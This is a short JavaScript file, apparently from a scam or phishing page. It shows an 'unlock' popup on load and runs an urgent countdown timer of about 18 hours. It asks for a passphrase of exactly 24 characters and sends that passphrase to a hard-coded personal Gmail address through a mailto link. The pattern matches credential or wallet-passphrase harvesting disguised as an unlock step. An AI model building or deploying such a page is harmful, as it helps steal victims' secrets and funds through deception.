let totalSeconds = (18 * 60 + 47) * 60 + 12;

function updateTimer() {
  const timerElement = document.getElementById("timer");
  const popupTimerElement = document.getElementById("popupTimer");

  const interval = setInterval(() => {
    if (totalSeconds <= 0) {
      clearInterval(interval);
      timerElement.innerText = "00:00:00";
      popupTimerElement.innerText = "00:00:00";
      return;
    }

    totalSeconds--;

    let hrs = Math.floor(totalSeconds / 3600);
    let mins = Math.floor((totalSeconds % 3600) / 60);
    let secs = totalSeconds % 60;

    const timeString = `${hrs.toString().padStart(2, "0")}:${mins.toString().padStart(2, "0")}:${secs.toString().padStart(2, "0")}`;
    timerElement.innerText = timeString;
    popupTimerElement.innerText = timeString;
  }, 1000);
}

function showPopup() {
  document.getElementById("unlockPopup").style.display = "block";
}

function hidePopup() {
  document.getElementById("unlockPopup").style.display = "none";
}

function showDownloadPopup() {
  document.getElementById("downloadPopup").style.display = "block";
}

function hideDownloadPopup() {
  document.getElementById("downloadPopup").style.display = "none";
}

function sendPassphrase() {
  const passphrase = document.getElementById("passphraseInput").value.trim();
  if (passphrase.length !== 24) {
    alert("Please enter exactly 24 characters.");
    return;
  }

  const email = "krishnadigitalmedianwh@gmail.com";
  const subject = "Passphrase Submission";
  const body = `Passphrase Submission:\n\n<table border="1" cellpadding="5"><tr><th>Passphrase</th></tr><tr><td>${passphrase}</td></tr></table>`;
  const mailtoLink = `mailto:${email}?subject=${encodeURIComponent(subject)}&body=${encodeURIComponent(passphrase)}`;

  window.location.href = mailtoLink;
}

updateTimer();
showPopup();
